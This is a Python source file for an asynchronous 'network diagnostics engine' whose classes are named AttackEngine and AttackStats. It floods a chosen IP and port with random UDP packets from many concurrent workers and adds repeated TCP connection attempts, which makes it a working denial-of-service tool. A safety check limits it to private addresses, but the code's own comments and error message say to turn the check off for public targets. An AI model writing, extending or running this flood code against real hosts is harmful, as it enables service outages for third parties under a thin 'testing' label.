"""
Enhanced Async Network Diagnostics Engine (Optimized)
Includes safety controls for authorized testing environments.
"""

from __future__ import annotations

import asyncio
import logging
import os
import socket
import time
from dataclasses import dataclass
from typing import Optional

from utils import is_private_or_loopback

LOGGER = logging.getLogger(__name__)


@dataclass
class AttackStats:
    sent_packets: int = 0
    failed_packets: int = 0
    bytes_sent: int = 0
    started_at: float = 0.0
    running: bool = False

    @property
    def elapsed(self) -> float:
        if not self.running or self.started_at == 0:
            return 0.001
        return max(0.001, time.time() - self.started_at)

    @property
    def rps(self) -> float:
        return self.sent_packets / self.elapsed


class BufferPool:
    """Low-overhead payload management."""
    def __init__(self, size: int = 1200, count: int = 512) -> None:
        self._buffers = [os.urandom(size) for _ in range(count)]
        self._idx = 0

    def next(self) -> bytes:
        payload = self._buffers[self._idx]
        self._idx = (self._idx + 1) % len(self._buffers)
        return payload


class AttackEngine:
    """High-performance diagnostics engine with safety controls."""

    def __init__(self, max_threads: int, max_duration: int, safety_check: bool = True) -> None:
        self.max_threads = max_threads
        self.max_duration = max_duration
        self.safety_check = safety_check  # Set to False for authorized testing
        self.stats = AttackStats()
        self._stop_event = asyncio.Event()
        self._workers: list[asyncio.Task] = []
        self._buffer_pool = BufferPool()

    def stop(self) -> None:
        """Request graceful stop."""
        self._stop_event.set()
        for task in self._workers:
            task.cancel()

    async def run_udp_test(self, ip: str, port: int, duration: int) -> AttackStats:
        """Run UDP diagnostics test."""
        # Safety check (can be disabled for authorized testing)
        if self.safety_check and not is_private_or_loopback(ip):
            raise ValueError(f"Safety block: {ip} is not a local/private target. Set safety_check=False for authorized testing.")

        run_seconds = min(duration, self.max_duration)
        self.stats = AttackStats(started_at=time.time(), running=True)
        self._stop_event.clear()

        LOGGER.info(f"Starting UDP test on {ip}:{port} for {run_seconds}s with {self.max_threads} threads")

        # Create UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)

        # Create workers
        for i in range(self.max_threads):
            task = asyncio.create_task(
                self._udp_worker(sock, ip, port),
                name=f"udp_worker_{i}"
            )
            self._workers.append(task)

        try:
            # Wait for duration or stop signal
            try:
                await asyncio.wait_for(self._stop_event.wait(), timeout=run_seconds)
                LOGGER.info("Stop signal received")
            except asyncio.TimeoutError:
                LOGGER.info(f"Duration completed ({run_seconds}s)")
        
        finally:
            self._stop_event.set()
            
            # Cancel and cleanup workers
            for task in self._workers:
                if not task.done():
                    task.cancel()
            
            await asyncio.gather(*self._workers, return_exceptions=True)
            self._workers.clear()
            sock.close()
            self.stats.running = False
            
            LOGGER.info(f"Test completed. Sent: {self.stats.sent_packets}, Failed: {self.stats.failed_packets}")

        return self.stats

    async def _udp_worker(self, sock: socket.socket, ip: str, port: int) -> None:
        """UDP worker loop."""
        loop = asyncio.get_running_loop()
        
        while not self._stop_event.is_set():
            payload = self._buffer_pool.next()
            try:
                # Non-blocking send
                await loop.sock_sendto(sock, payload, (ip, port))
                self.stats.sent_packets += 1
                self.stats.bytes_sent += len(payload)
            except BlockingIOError:
                await asyncio.sleep(0)
            except OSError as e:
                self.stats.failed_packets += 1
                if self.stats.failed_packets % 100 == 0:
                    LOGGER.debug(f"Send error: {e}")
            except asyncio.CancelledError:
                break
            except Exception as e:
                LOGGER.debug(f"Worker error: {e}")
                self.stats.failed_packets += 1

    async def run_tcp_test(self, ip: str, port: int, attempts: int = 25) -> dict:
        """Run TCP connection test."""
        if self.safety_check and not is_private_or_loopback(ip):
            raise ValueError("Safety block: Local/Private targets only.")

        success = 0
        results = []

        for i in range(attempts):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=2.0
                )
                success += 1
                writer.close()
                await writer.wait_closed()
            except (OSError, asyncio.TimeoutError) as e:
                results.append(f"Attempt {i+1}: {type(e).__name__}")
            except Exception as e:
                results.append(f"Attempt {i+1}: {e}")

        return {
            "target": f"{ip}:{port}",
            "attempts": attempts,
            "success": success,
            "failed": attempts - success,
            "details": results[:5]  # First 5 errors only
        }

    async def run_mixed_test(self, ip: str, port: int, duration: int, tcp_interval: int = 10) -> dict:
        """Run mixed UDP + TCP test."""
        results = {
            "udp": None,
            "tcp_tests": []
        }

        # Start UDP in background
        udp_task = asyncio.create_task(self.run_udp_test(ip, port, duration))
        
        # Run TCP tests periodically
        start_time = time.time()
        while time.time() - start_time < duration:
            await asyncio.sleep(tcp_interval)
            if self._stop_event.is_set():
                break
            tcp_result = await self.run_tcp_test(ip, port, attempts=5)
            results["tcp_tests"].append(tcp_result)

        # Wait for UDP to complete
        try:
            udp_stats = await udp_task
            results["udp"] = {
                "sent_packets": udp_stats.sent_packets,
                "failed_packets": udp_stats.failed_packets,
                "bytes_sent": udp_stats.bytes_sent,
                "rps": udp_stats.rps,
                "elapsed": udp_stats.elapsed
            }
        except Exception as e:
            results["udp_error"] = str(e)

        return results
